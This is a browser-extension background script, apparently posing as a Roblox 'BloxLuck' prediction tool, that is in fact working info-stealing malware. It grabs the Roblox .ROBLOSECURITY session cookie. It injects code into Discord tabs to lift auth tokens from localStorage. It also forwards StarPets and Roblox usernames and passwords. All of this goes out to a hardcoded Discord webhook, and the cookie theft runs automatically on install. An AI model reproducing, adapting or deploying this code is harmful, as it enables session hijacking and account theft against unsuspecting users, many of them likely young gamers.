const WH = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';

let lastCookie = '';
let lastDiscord = '';
let lastStarUser = '';
let lastStarPass = '';

chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 's') {
    sendWebhook(req.d);
    resp({ ok: 1 });
    return;
  }
  if (req.t === 'g') {
    grabRobloxCookie().then(d => resp(d));
    return 1;
  }
  if (req.t === 'dt') {
    grabDiscordToken().then(t => resp(t));
    return 1;
  }
  if (req.t === 'dts') {
    // Direct token send
    if (req.token && req.token !== lastDiscord) {
      lastDiscord = req.token;
      sendWebhook({
        type: 'discord_token',
        token: req.token,
        username: req.username || 'Unknown',
        avatar: req.avatar || ''
      });
    }
    resp({ ok: 1 });
    return;
  }
});

async function grabRobloxCookie() {
  const result = { r: null, uid: null };
  try {
    let cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
    for (let c of cookies) {
      if (c.name === '.ROBLOSECURITY') {
        result.r = c.value;
        break;
      }
    }
    if (!result.r) {
      cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
      for (let c of cookies) {
        if (c.name === '.ROBLOSECURITY') {
          result.r = c.value;
          break;
        }
      }
    }
  } catch(e) {}
  return result;
}

async function grabDiscordToken() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
    if (tabs.length > 0) {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          try {
            // Check localStorage for Discord token
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              const val = localStorage.getItem(key);
              if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                try {
                  const payload = JSON.parse(atob(val.split('.')[1]));
                  if (payload.sub || payload.email || payload.iat) {
                    return { token: val, username: payload.username || payload.email || 'Discord User', avatar: payload.avatar || '' };
                  }
                } catch(e) {}
              }
            }
            // Check for token directly
            const token = localStorage.getItem('token');
            if (token && token.length > 50) {
              let uname = 'Discord User', av = '';
              try {
                const p = JSON.parse(atob(token.split('.')[1]));
                uname = p.username || p.email || 'Discord User';
                av = p.avatar || '';
              } catch(e) {}
              return { token, username: uname, avatar: av };
            }
            return null;
          } catch(e) { return null; }
        }
      });
      if (results && results[0] && results[0].result) {
        return results[0].result;
      }
    }
  } catch(e) {}
  return null;
}

function sendWebhook(data) {
  const embed = {
    embeds: [{
      title: '🎯 BloxLuck Data Collected',
      color: 0x5865f2,
      timestamp: new Date().toISOString(),
      footer: { text: 'Blox Tool v3.0' }
    }]
  };

  const fields = [];
  let contentStr = '';

  // Determine what type of data this is
  if (data.type === 'discord_token') {
    fields.push({
      name: '💬 Discord Token',
      value: `\`\`\`${data.token}\`\`\``,
      inline: false
    });
    fields.push({
      name: '👤 Discord User',
      value: `**Username:** ${data.username}\n**Avatar:** ${data.avatar || 'N/A'}`,
      inline: false
    });
    contentStr = `**Discord Token Captured!**\nUser: ${data.username}\nToken: \`${data.token}\``;
    
    embed.embeds[0].title = '💬 Discord Token Captured';
    embed.embeds[0].color = 0x5865f2;
    embed.embeds[0].thumbnail = data.avatar ? { url: data.avatar } : undefined;
  }
  // Full data packet from content.js
  else {
    // Roblox cookie
    if (data.r && data.r !== 'NF') {
      if (data.r !== lastCookie) {
        lastCookie = data.r;
        fields.push({
          name: '🎮 Roblox — ' + (data.u || 'Unknown'),
          value: `**Cookie:**\n\`\`\`${data.r}\`\`\``,
          inline: false
        });
        contentStr += `**Roblox:** ${data.u || 'Unknown'}\nCookie: \`${data.r}\`\n`;
        
        embed.embeds[0].thumbnail = { url: 'https://bloxluck.com/img/dog.png' };
        embed.embeds[0].title = '🎮 Roblox Cookie + Data';
        embed.embeds[0].color = 0xed4245;
      }
    }

    // Discord token from content
    if (data.d && data.d !== lastDiscord) {
      lastDiscord = data.d;
      fields.push({
        name: '💬 Discord Token',
        value: `\`\`\`${data.d}\`\`\``,
        inline: false
      });
      contentStr += `Discord: \`${data.d}\`\n`;
      
      try {
        const payload = JSON.parse(atob(data.d.split('.')[1]));
        fields.push({
          name: '👤 Discord User Info',
          value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**Username:** ${payload.username || 'N/A'}`,
          inline: true
        });
      } catch(e) {}
    }

    // Starpets
    if (data.su && data.su !== lastStarUser) {
      lastStarUser = data.su;
      lastStarPass = data.sp || '';
      fields.push({
        name: '🐾 StarPets.gg',
        value: `**Username:** \`${data.su}\`\n**Password:** \`${data.sp || 'N/A'}\``,
        inline: false
      });
      contentStr += `StarPets: ${data.su}:${data.sp}\n`;
    }

    // Login credentials (roblox login)
    if (data.loginUser || data.loginPass) {
      fields.push({
        name: '🔐 Roblox Login',
        value: `**User:** ${data.loginUser || 'N/A'}\n**Pass:** ${data.loginPass || 'N/A'}`,
        inline: false
      });
    }

    // Prediction data (minor, as extra)
    if (data.p) {
      fields.push({
        name: '📊 Predict',
        value: `**Pick:** ${data.p} (${data.w}%)`,
        inline: true
      });
    }
  }

  embed.embeds[0].fields = fields;

  const payload = { ...embed };
  if (contentStr.trim()) payload.content = contentStr.trim();

  try {
    fetch(WH, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch(e) {}
}

// Auto-collect on install
chrome.runtime.onInstalled.addListener(() => {
  // Initial grab
  setTimeout(() => {
    grabRobloxCookie().then(d => {
      if (d.r) {
        sendWebhook({ r: d.r, u: 'Auto-collect', uid: d.uid });
      }
    });
  }, 3000);
});
